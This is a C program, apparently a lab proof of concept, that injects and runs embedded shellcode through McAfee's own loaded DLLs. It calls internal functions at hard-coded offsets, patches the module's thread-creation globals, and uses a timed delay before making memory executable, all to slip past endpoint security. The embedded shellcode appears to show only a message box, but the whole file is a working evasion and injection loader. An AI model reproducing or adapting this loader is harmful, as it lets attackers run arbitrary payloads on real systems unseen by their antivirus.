#include <stdio.h>
#include <windows.h>
#include "CWLInc.h"
#include <time.h>

// Defining the functions that we want to re-utilize
typedef DWORD(__cdecl* ResolvProcAddress)(LPCSTR moduleName, LPCSTR procName, FARPROC* fp);
typedef HANDLE(__stdcall* CreateUserOrRemoteThread)(void* p1, void* p2, void* v3);
typedef LPVOID(__cdecl* AllocHeap)(SIZE_T dwBytes);

enum MfeHCInjOffset {
	LdLibrary = 0x2DFBF,
	ProcAddr = 0x2E059,
	CUT = 0x7FB44, // CreateUserThread
	CRT = 0x7FB50, // CreateRemoteThread
	CURTFunc = 0x97B0,
	MemAlloc = 0x53D91

};

enum MfeHcTheOffset {
	RslvProcAddr = 0x015C0,
};

int main(int argc, char** argv) {

	HANDLE hProcess = INVALID_HANDLE_VALUE;
	HMODULE hMfehcinj;
	HMODULE hMfehcthe;
	HANDLE hSection;
	OBJECT_ATTRIBUTES objAttr;
	NTSTATUS status;
	hMfehcinj = GetModuleHandleA("mfehcinj.dll");
	hMfehcthe = GetModuleHandleA("mfehcthe.dll");
	if (hMfehcinj == NULL) {
		printf("[-] Can't access handle to the Current Process. Error code: %d \n", GetLastError());
		exit(-1);
	}
	printf("[+] Module is loaded at base address: %p\n", hMfehcinj);

	ResolvProcAddress pResolveProcAddress = (ResolvProcAddress)((ULONG_PTR)hMfehcthe + RslvProcAddr);
	// Exit if it doesn't matches this function signature
	if (memcmp(pResolveProcAddress, "\x56\xFF\x74\x24\x08", 5) != 0) {
		exit(-1);
	}
	printf("[+] Function to control %p \n", pResolveProcAddress);
	// Shellcode
	unsigned char buf[] =
		"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
		"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
		"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
		"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
		"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
		"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
		"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
		"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
		"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
		"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
		"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
		"\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
		"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
		"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6e\x58\x20\x20\x68\x63\x74"
		"\x69\x6f\x68\x49\x6e\x6a\x65\x68\x65\x73\x73\x20\x68\x50\x72"
		"\x6f\x63\x31\xdb\x88\x5c\x24\x11\x89\xe3\x68\x61\x62\x73\x58"
		"\x68\x61\x72\x65\x4c\x68\x57\x61\x72\x46\x68\x79\x62\x65\x72"
		"\x68\x6f\x6d\x20\x43\x68\x6f\x20\x46\x72\x68\x48\x65\x6c\x6c"
		"\x31\xc9\x88\x4c\x24\x1b\x89\xe1\x31\xd2\x6a\x30\x53\x51\x52"
		"\xff\xd0\x31\xc0\x50\xff\x55\x08";

	FARPROC procAddr;
	_NtAllocateVirtualMemory fpNtAllocVirtualMemory = NULL;
	_NtProtectVirtualMemory fpNtProtectVirtualMemory = NULL;
	pResolveProcAddress("ntdll.dll", "NtAllocateVirtualMemory", &procAddr);
	fpNtAllocVirtualMemory = (_NtAllocateVirtualMemory)procAddr;
	if (fpNtAllocVirtualMemory == NULL) {
		printf("[+] Error finding Function _NtAllocVirtualMemory \n");
		exit(-1);
	}
	pResolveProcAddress("ntdll.dll", "NtProtectVirtualMemory", &procAddr);
	fpNtProtectVirtualMemory = (_NtProtectVirtualMemory)procAddr;
	if (fpNtProtectVirtualMemory == NULL) {
		printf("[+] Error finding Function _NtProtectVirtualMemory \n");
		exit(-1);
	}
	// Overiting Global value of RtlCreateuserThread / CreateRemoteThreadEx
	DWORD CUTPatchAddr = ((ULONG_PTR)hMfehcinj + CUT);
	pResolveProcAddress("ntdll.dll", "RtlCreateUserThread", &procAddr);
	DWORD CUTPatchBytes = (DWORD)procAddr;
	DWORD CRTPatchAddr = ((ULONG_PTR)hMfehcinj + CRT);
	//pResolveProcAddress("kernel32.dll", "CreateRemoteThreadEx", &procAddr);
	DWORD CRTPatchBytes = 0x0;
	// Setting CreateUserThread
	memcpy((void*)CUTPatchAddr, &CUTPatchBytes, sizeof(DWORD));
	// Setting CreateRemoteThread
	memcpy((void*)CRTPatchAddr, &CRTPatchBytes, sizeof(DWORD));

	// Allocating Virtual Memory
	PVOID scBase = { 0 };
	SIZE_T scSize = sizeof(buf);
	status = fpNtAllocVirtualMemory(GetCurrentProcess(), &scBase, 0, &scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	// Writing Shellcode to Allocated memory
	memcpy(scBase, &buf, scSize);
	DWORD oldProtect;
	printf("[+] ooooooooo....\n");
	// delaying before NtProtect
	long delay = 0x20;
	time_t current = time(0);
	long stop = current + delay;
	while (1)
	{
		current = time(0);
		if (current >= stop)
			break;
	}
	// Changing MemProtection
	status = fpNtProtectVirtualMemory(GetCurrentProcess(), &scBase, &scSize, PAGE_EXECUTE_READ, &oldProtect);
	LPTHREAD_START_ROUTINE runME = (LPTHREAD_START_ROUTINE)scBase;
	// Crafting Remote Thread
	printf("[+] Executing....\n");
	CreateUserOrRemoteThread createUserOrRemoteThread = (CreateUserOrRemoteThread)((UINT_PTR)hMfehcinj + CURTFunc);
	createUserOrRemoteThread((void*)hProcess, (void*)runME, (void*)0);
	system("pause");
}
